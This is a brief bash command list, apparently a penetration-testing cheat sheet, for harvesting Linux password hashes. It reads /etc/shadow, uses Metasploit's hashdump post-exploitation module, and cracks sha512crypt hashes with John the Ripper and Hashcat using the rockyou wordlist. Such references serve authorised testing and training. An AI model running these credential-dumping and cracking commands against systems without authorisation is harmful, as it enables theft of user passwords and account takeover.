
```bash
cat /etc/shadow

# Metasploit
use post/linux/gather/hashdump

john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat
hashcat --help | grep 1800
hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
```
